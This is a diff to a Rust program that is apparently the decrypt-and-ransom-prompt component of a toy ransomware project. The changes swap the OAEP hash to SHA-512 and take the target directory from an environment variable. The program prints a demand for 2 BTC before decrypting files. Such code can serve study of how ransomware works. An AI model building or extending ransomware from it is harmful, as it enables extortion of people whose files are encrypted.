@@ -6,7 +6,7 @@ use aes_siv::{
     Nonce,
 };
 use rsa::{errors::Error as RsaError, pkcs8::DecodePrivateKey, Oaep, RsaPrivateKey};
-use sha2::{digest::InvalidLength, Sha256};
+use sha2::{digest::InvalidLength,Sha512};
 use std::fs::{write, File};
 use std::io::{stdin, stdout, Error as IOError, Read, Write};
 use std::path::Path;
@@ -39,7 +39,7 @@ fn decrypt_file(path: &Path, rsa_key: &RsaPrivateKey) -> Result<(), CipherError>
 
             let encrypted_aes_key_bytes = buffer.split_off(final_length);
 
-            let padding = Oaep::new::<Sha256>();
+            let padding = Oaep::new::<Sha512>();
 
             let aes_key = rsa_key.decrypt(padding, &encrypted_aes_key_bytes)?;
 
@@ -76,6 +76,9 @@ fn pause() {
 }
 
 fn main() {
+
+    let target_dir = std::env::var("TARGET_DIR").unwrap();
+
     let wallet = "my_wallet";
     println!(
         "Your data is kidnnaped by a ransomware Hihihaha, pay 2 BTC to this wallet : {}",
@@ -86,7 +89,7 @@ fn main() {
 
     let rsa_key = RsaPrivateKey::read_pkcs8_pem_file("./key.pem").expect("no private key found");
 
-    for entry in WalkDir::new("./some_target_dir")
+    for entry in WalkDir::new(target_dir)
         .into_iter()
         .filter_map(|e| e.ok())
     {
